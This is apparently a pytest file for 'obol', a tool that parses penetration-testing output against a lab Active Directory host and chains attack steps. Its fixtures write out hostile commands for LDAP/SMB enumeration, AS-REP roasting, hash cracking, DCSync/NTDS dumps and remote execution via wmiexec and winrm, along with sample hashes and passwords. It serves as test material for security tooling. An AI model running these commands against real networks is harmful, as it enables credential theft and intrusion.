import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from obol.facts import Fact
from obol.pack import load_pack, next_actions
from obol.parsers import parse_action_output
from obol.workspace import Workspace


def _workspace() -> Workspace:
    ws = Workspace(Path("/tmp/obol-parser-test"))
    ws.target = "10.10.10.10"
    ws.add_scope(ws.target)
    ws.facts.add(Fact("target.configured", "host:10.10.10.10", {"target": ws.target}, source="test"))
    return ws


def test_configured_target_unlocks_nmap_first_not_direct_nxc():
    ws = _workspace()
    actions = next_actions(ws.facts)
    ids = {action.id for action in actions}
    assert actions[0].id == "nmap-fast-open-ports"
    assert "ad-dc-identify" not in ids


def test_nmap_quick_scan_produces_port_facts_for_followup():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "nmap-fast-open-ports")
    out = """
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-14 00:00 UTC
Nmap scan report for 10.10.10.10
Host is up (0.042s latency).
Discovered open port 389/tcp on 10.10.10.10
Discovered open port 445/tcp on 10.10.10.10
Discovered open port 88/tcp on 10.10.10.10
Nmap done: 1 IP address (1 host up) scanned in 42.00 seconds
"""
    facts = parse_action_output(
        action,
        ws,
        "nmap -Pn -p- --min-rate 5000 --open -oN nmap-allports.txt 10.10.10.10",
        out,
        "",
        "test",
    )
    for fact in facts:
        ws.facts.add(fact)
    kinds = {fact.kind for fact in facts}
    assert {"host.up", "scan.nmap.quick", "ports.open", "port:389", "port:445", "port:88"} <= kinds
    next_ids = [action.id for action in next_actions(ws.facts)]
    assert next_ids[0] == "nmap-version-scripts"
    assert "ad-dc-identify" in next_ids


def test_nmap_version_scan_produces_service_reachability_without_access():
    ws = _workspace()
    ws.facts.add(Fact("host.up", "host:10.10.10.10", {"target": ws.target}, source="test"))
    ws.facts.add(Fact("scan.nmap.quick", "host:10.10.10.10", {"profile": "open-port-discovery"}, source="test"))
    ws.facts.add(Fact("ports.open", "host:10.10.10.10", {"ports": [88, 389, 445]}, source="test"))
    action = next(action for action in load_pack() if action.id == "nmap-version-scripts")
    out = """
Nmap scan report for 10.10.10.10
Host is up (0.041s latency).
PORT    STATE SERVICE       VERSION
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos
389/tcp open  ldap          Microsoft Windows Active Directory LDAP
445/tcp open  microsoft-ds  Windows Server 2019 Standard
Service detection performed. Please report any incorrect results.
"""
    facts = parse_action_output(
        action,
        ws,
        "nmap -Pn -sC -sV -p 88,389,445 -oN nmap-version.txt 10.10.10.10",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"scan.nmap.version", "kerberos.reachable", "ldap.reachable", "smb.reachable", "ad.dc_candidate"} <= kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds
    assert "foothold.windows" not in kinds


def test_nxc_ldap_smoke_produces_domain_and_reachability_not_access():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "ad-dc-identify")
    out = """
LDAP        10.10.10.10     389    DC01         [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:corp.local)
"""
    facts = parse_action_output(action, ws, "nxc ldap 10.10.10.10 -u '' -p ''", out, "", "test")
    kinds = {fact.kind for fact in facts}
    assert {"ad.dc_candidate", "ad.domain_known", "ad.base_dn", "ldap.reachable"} <= kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds
    assert "foothold.windows" not in kinds


def test_nxc_ldap_users_parses_generic_users_without_walkthrough_names():
    ws = _workspace()
    ws.facts.add(Fact("ad.domain_known", "domain:corp.local", {"name": "corp.local"}, source="test"))
    action = next(action for action in load_pack() if action.id == "ad-anon-ldap-enum")
    out = """
LDAP        10.10.10.10     389    DC01         [*] Total of records returned 4
LDAP        10.10.10.10     389    DC01         Administrator
LDAP        10.10.10.10     389    DC01         alice.smith
LDAP        10.10.10.10     389    DC01         backup-svc
sAMAccountName: build.operator
description: ordinary lab hint text
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc ldap 10.10.10.10 -u '' -p '' --users",
        out,
        "",
        "test",
    )
    user_fact = next(fact for fact in facts if fact.kind == "ad.user_list")
    assert user_fact.value["users"] == ["Administrator", "alice.smith", "backup-svc", "build.operator"]
    assert user_fact.value["count"] == 4
    kinds = {fact.kind for fact in facts}
    assert "ad.anonymous_bind" in kinds
    assert "credential.available" not in kinds
    assert "credential.admin" not in kinds
    assert "access.admin" not in kinds


def test_nxc_smb_banner_produces_domain_and_smb_reachability_not_ldap_bind():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "ad-dc-identify")
    out = """
SMB         10.10.10.10     445    DC01         [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:corp.local) (signing:True)
"""
    facts = parse_action_output(action, ws, "nxc smb 10.10.10.10", out, "", "test")
    kinds = {fact.kind for fact in facts}
    assert {"ad.dc_candidate", "ad.domain_known", "ad.base_dn", "smb.reachable"} <= kinds
    assert "ad.anonymous_bind" not in kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_nxc_smb_guest_rid_brute_produces_user_list_and_guest_session_only():
    ws = _workspace()
    ws.facts.add(Fact("ad.domain_known", "domain:corp.local", {"name": "corp.local"}, source="test"))
    action = next(action for action in load_pack() if action.id == "ad-user-enum")
    out = r"""
SMB         10.10.10.10     445    DC01         [+] corp.local\guest:
SMB         10.10.10.10     445    DC01         500: CORP\Administrator (SidTypeUser)
SMB         10.10.10.10     445    DC01         1105: CORP\alice.smith (SidTypeUser)
SMB         10.10.10.10     445    DC01         1106: CORP\DC01$ (SidTypeUser)
SMB         10.10.10.10     445    DC01         512: CORP\Domain Admins (SidTypeGroup)
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u guest -p '' --rid-brute",
        out,
        "",
        "test",
    )
    user_fact = next(fact for fact in facts if fact.kind == "ad.user_list")
    assert user_fact.value["users"] == ["Administrator", "alice.smith"]
    assert user_fact.value["method"] == "smb-rid"
    kinds = {fact.kind for fact in facts}
    assert "smb.guest_session" in kinds
    assert "ad.anonymous_bind" not in kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_rpcclient_enumdomusers_produces_user_list_without_access():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "ad-user-enum")
    out = """
user:[Administrator] rid:[0x1f4]
user:[svc-backup] rid:[0x459]
user:[DC01$] rid:[0x3e8]
"""
    facts = parse_action_output(
        action,
        ws,
        "rpcclient -U '' -N 10.10.10.10 -c 'enumdomusers'",
        out,
        "",
        "test",
    )
    user_fact = next(fact for fact in facts if fact.kind == "ad.user_list")
    assert user_fact.value["users"] == ["Administrator", "svc-backup"]
    kinds = {fact.kind for fact in facts}
    assert "ad.anonymous_bind" not in kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_nxc_smb_shares_produces_inventory_and_config_review_not_credentials():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "gpp-passwords")
    out = """
SMB         10.10.10.10     445    DC01         Share           Permissions     Remark
SMB         10.10.10.10     445    DC01         -----           -----------     ------
SMB         10.10.10.10     445    DC01         ADMIN$          NO ACCESS       Remote Admin
SMB         10.10.10.10     445    DC01         IPC$            READ            Remote IPC
SMB         10.10.10.10     445    DC01         NETLOGON        READ            Logon server share
SMB         10.10.10.10     445    DC01         SYSVOL          READ            Logon server share
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u '' -p '' --shares",
        out,
        "",
        "test",
    )
    shares_fact = next(fact for fact in facts if fact.kind == "smb.shares")
    assert shares_fact.value["count"] == 4
    assert [share["name"] for share in shares_fact.value["shares"]] == ["ADMIN$", "IPC$", "NETLOGON", "SYSVOL"]
    kinds = {fact.kind for fact in facts}
    assert "config.review" in kinds
    assert "credential.candidate" not in kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_smbclient_sysvol_gpp_cpassword_is_candidate_material_only():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "gpp-passwords")
    out = """
  .                                   D        0  Sun Sep 13 20:00:00 2026
  Groups.xml                          A     1234  Sun Sep 13 20:00:00 2026
<Properties userName="lab-user" cpassword="abcDEF123456==" />
"""
    facts = parse_action_output(
        action,
        ws,
        "smbclient '//10.10.10.10/SYSVOL' -N -c 'recurse; ls'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"config.review", "credential.candidate"} <= kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_hashcat_asrep_show_produces_plaintext_credential_not_access():
    ws = _workspace()
    ws.facts.add(Fact("ad.domain_known", "domain:corp.local", {"name": "corp.local"}, source="test"))
    action = next(action for action in load_pack() if action.id == "asrep-roast")
    out = "$krb5asrep$23$svc-audit@CORP.LOCAL:11223344556677889900:Spring2026!\n"
    facts = parse_action_output(
        action,
        ws,
        "hashcat -m 18200 asrep.hashes rockyou.txt --show",
        out,
        "",
        "test",
    )
    plain = next(fact for fact in facts if fact.kind == "credential.plaintext")
    assert plain.value["user"] == "svc-audit"
    assert plain.value["password"] == "Spring2026!"
    assert plain.value["hash_type"] == "asrep"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" in kinds
    assert "credential.admin" not in kinds
    assert "access.admin" not in kinds
    assert "foothold.windows" not in kinds


def test_hashcat_status_without_recovered_plaintext_does_not_create_credential():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "asrep-roast")
    out = """
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Recovered........: 0/1 (0.00%) Digests
"""
    facts = parse_action_output(
        action,
        ws,
        "hashcat -m 18200 asrep.hashes rockyou.txt",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert "credential.plaintext" not in kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_john_show_produces_plaintext_credential_not_privilege():
    ws = _workspace()
    ws.facts.add(Fact("ad.domain_known", "domain:corp.local", {"name": "corp.local"}, source="test"))
    action = next(action for action in load_pack() if action.id == "asrep-roast")
    out = """
svc-backup:LaborDay2026!:0:0:svc-backup:/home/svc-backup:/bin/bash

1 password hash cracked, 0 left
"""
    facts = parse_action_output(
        action,
        ws,
        "john asrep.hashes --show",
        out,
        "",
        "test",
    )
    plain = next(fact for fact in facts if fact.kind == "credential.plaintext")
    assert plain.value["user"] == "svc-backup"
    assert plain.value["password"] == "LaborDay2026!"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" in kinds
    assert "credential.admin" not in kinds
    assert "access.admin" not in kinds


def test_ldapsearch_naming_contexts_parse_base_dn():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "ad-anon-ldap-enum")
    out = """
dn:
namingContexts: DC=example,DC=internal
"""
    facts = parse_action_output(
        action,
        ws,
        "ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts",
        out,
        "",
        "test",
    )
    values = {fact.kind: fact.value for fact in facts}
    assert values["ad.domain_known"]["name"] == "example.internal"
    assert values["ad.base_dn"]["base_dn"] == "DC=example,DC=internal"
    assert "ldap.reachable" in values


def test_asrep_hash_parser_produces_candidate_material_only():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "asrep-roast")
    out = "$krb5asrep$23$user@CORP.LOCAL:abcdef1234567890"
    facts = parse_action_output(
        action,
        ws,
        "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.txt",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"hash.asrep", "credential.candidate"} <= kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_secretsdump_ntds_records_loot_and_krbtgt_as_crackable_material():
    ws = _workspace()
    ws.facts.add(Fact("ad.domain_known", "domain:acme.corp", {"name": "acme.corp"}, source="test"))
    action = next(action for action in load_pack() if action.id == "dcsync")
    out = r"""
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
acme.corp\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::
acme.corp\jdoe:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
acme.corp\mwallace:1105:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
[*] Kerberos keys grabbed
"""
    facts = parse_action_output(
        action,
        ws,
        "impacket-secretsdump 'acme.corp/dumpsvc:Passw0rd!'@10.10.10.10 -just-dc",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    # The win is recorded: domain secrets looted, krbtgt captured, NTLM material present.
    assert {"hash.ntlm", "hash.krbtgt", "loot.ntds", "credential.candidate"} <= kinds
    ntlm = next(fact for fact in facts if fact.kind == "hash.ntlm")
    assert ntlm.value["count"] == 4
    assert {entry["user"] for entry in ntlm.value["entries"]} == {"Administrator", "krbtgt", "jdoe", "mwallace"}
    assert ntlm.scope == "domain:acme.corp"
    candidate = next(fact for fact in facts if fact.kind == "credential.candidate")
    assert candidate.value["kind"] == "ntlm_hash"
    # But a raw hash is crackable/reusable material, not a validated login or new access.
    assert "credential.available" not in kinds
    assert "credential.plaintext" not in kinds
    assert "access.admin" not in kinds
    assert "access.system" not in kinds


def test_nxc_local_sam_dump_is_material_not_domain_loot():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "dump-secrets")
    # A local SAM dump: no krbtgt, no NTDS/DRSUAPI context -> not domain loot.
    out = r"""
SMB         10.10.10.10     445    WS01     [*] Dumping SAM hashes
SMB         10.10.10.10     445    WS01     Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
SMB         10.10.10.10     445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u localadmin -p 'hunter2' --sam",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"hash.ntlm", "credential.candidate"} <= kinds
    assert "loot.ntds" not in kinds
    assert "hash.krbtgt" not in kinds


def test_nxc_ntds_hashes_unlock_pass_the_hash_and_golden_ticket():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "dcsync")
    out = r"""
SMB         10.10.10.10     445    DC01     [*] Dumping the NTDS, this could take a while
SMB         10.10.10.10     445    DC01     acme.corp\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10     445    DC01     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::
SMB         10.10.10.10     445    DC01     acme.corp\sqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.10.10.10     445    DC01     [+] Dumped 3 NTDS.DIT secrets
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u dumpsvc -p 'Passw0rd!' --ntds",
        out,
        "",
        "test",
    )
    for fact in facts:
        ws.facts.add(fact)
    unlocked = {action.id for action in next_actions(ws.facts)}
    # hash.ntlm unlocks lateral movement by pass-the-hash; hash.krbtgt unlocks golden ticket.
    assert "lateral-exec" in unlocked
    assert "golden-ticket" in unlocked


def test_nxc_exec_whoami_system_proves_access_system():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "lateral-exec")
    out = r"""
SMB         10.10.10.10     445    DC01     [+] acme.corp\svc_backup:Passw0rd! (Pwn3d!)
SMB         10.10.10.10     445    DC01     [+] Executed command via wmiexec
SMB         10.10.10.10     445    DC01     nt authority\system
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u svc_backup -p 'Passw0rd!' -x 'whoami'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"access.system", "foothold.windows"} <= kinds
    system = next(fact for fact in facts if fact.kind == "access.system")
    assert system.value["identity"] == "nt authority\\system"


def test_winrm_exec_normal_user_proves_foothold_not_system_or_admin():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "lateral-exec")
    out = r"""
WINRM       10.10.10.10     5985   WEB02    [+] acme.corp\jdoe:Summer2026!
WINRM       10.10.10.10     5985   WEB02    acme.corp\jdoe
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc winrm 10.10.10.10 -u jdoe -p 'Summer2026!' -X 'whoami'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert "foothold.windows" in kinds
    foothold = next(fact for fact in facts if fact.kind == "foothold.windows")
    assert foothold.value.get("identity") == "acme.corp\\jdoe"
    # A non-privileged shell is code execution, not SYSTEM or admin on its own.
    assert "access.system" not in kinds
    assert "access.admin" not in kinds


def test_wmiexec_interactive_shell_system_proves_access_system():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "lateral-exec")
    out = r"""
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>
"""
    facts = parse_action_output(
        action,
        ws,
        "impacket-wmiexec 'acme.corp/svc_backup:Passw0rd!'@10.10.10.10",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"access.system", "foothold.windows"} <= kinds


def test_non_exec_command_with_identity_text_does_not_prove_foothold():
    ws = _workspace()
    action = next(action for action in load_pack() if action.id == "ad-anon-ldap-enum")
    # An enum command whose output merely mentions a domain\user must not be
    # mistaken for command execution.
    out = "dn: CN=jdoe\nsAMAccountName: jdoe\nmemberOf: CN=Admins\nCORP\\jdoe\n"
    facts = parse_action_output(
        action,
        ws,
        "ldapsearch -x -H ldap://10.10.10.10 -b dc=acme,dc=corp '(objectClass=user)'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert "foothold.windows" not in kinds
    assert "access.system" not in kinds
